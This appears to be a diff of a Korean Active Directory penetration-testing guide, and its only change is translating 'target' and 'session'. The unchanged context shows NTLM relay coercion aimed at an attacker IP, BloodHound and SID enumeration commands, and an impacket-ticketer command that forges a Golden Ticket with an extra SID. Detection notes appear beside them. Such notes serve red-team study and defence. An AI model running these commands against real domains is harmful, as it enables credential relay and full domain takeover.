@@ -2,7 +2,7 @@
 
 AD 환경의 인증 구성(Kerberos, NTLM, LDAP Signing 등)에 따라 사용 가능한 공격 기법과 명령어가 달라진다.
 
-타겟의 환경 설정을 먼저 파악한 후 적합한 공격 방식을 선택해야 한다.
+target의 환경 설정을 먼저 파악한 후 적합한 공격 방식을 선택해야 한다.
 
 ---
 
@@ -37,7 +37,7 @@ Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibil
 
 ## 인증 방식별 명령어 분기
 
-대부분의 Impacket, nxc 도구는 패스워드 / NTLM 해시 / Kerberos 티켓 세 가지 인증 방식을 지원한다. 타겟 환경에 따라 적절한 방식을 선택한다.
+대부분의 Impacket, nxc 도구는 패스워드 / NTLM 해시 / Kerberos 티켓 세 가지 인증 방식을 지원한다. target 환경에 따라 적절한 방식을 선택한다.
 
 ### 패스워드 인증 (기본)
 
@@ -159,7 +159,7 @@ bloodhound-python -u <user> -d <domain> -dc <dc_fqdn> -c all \
 
 !!! warning "Kerberos 인증 시 주의"
     Kerberos 인증은 반드시 FQDN(호스트 이름)을 사용해야 한다. IP 주소로는 Kerberos 인증이 불가능하다.
-    `-k` 플래그 사용 시 타겟을 IP가 아닌 FQDN으로 지정할 것.
+    `-k` 플래그 사용 시 target을 IP가 아닌 FQDN으로 지정할 것.
 
 ---
 
@@ -244,13 +244,13 @@ sequenceDiagram
     participant T as Target
     V->>A: NTLM Auth (Negotiate/Challenge/Auth)
     A->>T: Relay (Auth 메시지 전달)
-    T-->>A: 인증 성공 (세션 수립)
+    T-->>A: 인증 성공 (session 수립)
     A->>T: 명령 실행 / LDAP 조작 / 인증서 발급
 ```
 
 **필수 조건:**
 
-- 타겟 서비스의 SMB Signing이 비활성화(Not Required)이거나
+- target 서비스의 SMB Signing이 비활성화(Not Required)이거나
 - LDAP Signing/Channel Binding이 비강제이거나
 - ADCS HTTP Enrollment Endpoint에 EPA(Extended Protection)가 없는 경우
 
@@ -273,7 +273,7 @@ python3 Coercer.py -u <user> -p <pass> -d <domain> -l <attacker_ip> -t <target_i
 !!! warning "탐지"
     NTLM Relay: Event 4624 (Type 3 로그온) 소스 IP와 대상 호스트 불일치 모니터링. SMB Signing 활성화 및 LDAP Channel Binding 설정으로 예방.
 
-### Relay 타겟 선정
+### Relay target 선정
 
 ```bash
 # SMB Signing 비활성화 호스트 찾기
@@ -361,7 +361,7 @@ Get-ADTrust -Filter *
 impacket-lookupsid <domain>/<user>:<pass>@<other_dc_ip>
 
 # Inter-realm TGT 요청 (Golden Ticket + SID History)
-# 현재 도메인의 krbtgt 해시 + 타겟 도메인의 SID로 TGT 위조
+# 현재 도메인의 krbtgt 해시 + target 도메인의 SID로 TGT 위조
 impacket-ticketer -nthash <krbtgt_hash> -domain-sid <current_sid> \
   -domain <current_domain> -extra-sid <target_domain_sid>-519 Administrator
 ```
